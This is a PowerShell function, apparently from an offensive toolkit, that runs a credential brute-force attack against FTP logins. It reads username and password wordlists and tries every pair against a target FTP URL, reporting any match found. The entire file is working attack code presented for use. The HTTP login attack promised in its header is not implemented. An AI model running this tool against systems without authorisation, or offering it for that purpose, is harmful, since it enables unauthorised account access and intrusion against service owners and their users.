function Execute-bruteforceattack
{


#.SYNOPSIS
#Powershell Script is for doing bruteforce attack on well known services

#Description
#This Script is able to connect to wellknown services and do bruteforce attack on FTP and HTTP Login page.

#Parameter Target
#This parameter is for specify the target IP Address or URL.

#Parameter Port
#The -Port switch is for specify the port number of the Target IP Address or URL.

#Parameter UserFile
#This Parameter is for specify the UserFile   for FTP and HTTP UserName Files.

#Parameter PassFile
#This Parameter is for Specify the PassFile for FTP and HTTP Password Files.

#Parameter StoponSuccessfulAttack
#this paratmeter is stop the brute against successful attack

#Parameter Service
#This Parameter is for specify the service FTP or HTTP

 [cmdletbinding()] 
     Param(
       [Parameter(Mandatory=$True)]
	   [string]
       $Target,
       [Parameter(Mandatory=$True)]
	   [string]
       $UserFile,
       [Parameter(Mandatory=$True)]
	   [string]
       $PassFile,
       [Parameter(Mandatory=$True)]
	   [string]
       $StoponSuccessFulAttack = "True",
       [Parameter(Mandatory=$True)]
	   [string]
       $Service,
       [Parameter(Mandatory=$True)]
	   [string]
       $Protocol
       )

       $url = $Protocol + "://" + $Target
       
       
    
        Write-Verbose "Starting Brute-Force"
        
        $targetusers = Get-Content -Path $UserFile
        $targetpasswords = Get-Content -Path $PassFile
        if (!$targetusers) { 
            $targetusers = $UserFile
            Write-Verbose "UserList file does not exist."
            Write-Verbose $targetusers
        }
        if (!$targetpasswords) {
            $targetpasswords = $PassFile
            Write-Verbose "PasswordList file does not exist."
            Write-Verbose $targetpasswords
        }
        

       if ($service -eq "FTP")
        {
            Write-Output "Starting BruteForce Attack"

            :UsernameLoop foreach ($user in $targetusers)
            {
                foreach ($pass in $targetpasswords)
                {
                    try
                    {
                        
                        $ftpRequest = [System.Net.FtpWebRequest]::Create($url)
                        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
                        Write-Verbose "Checking $user : $pass"
                        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($user, $pass)
                        $FTPRequest.UsePassive = $false
                        $FTPRequest.KeepAlive = $false;
                        $result = $ftpRequest.GetResponse()
                        $message = $result.BannerMessage + $result.WelcomeMessage
                        Write-Output "Match found! $user : $pass"
                        $success = $true
                        if ($StoponSuccessFulAttack)
                        {
                            break UsernameLoop
                        }
                    }

                    catch
                    {
                        $message = $error[0].ToString()
                        $success = $false
                    }

                   
                }
            }
}
}

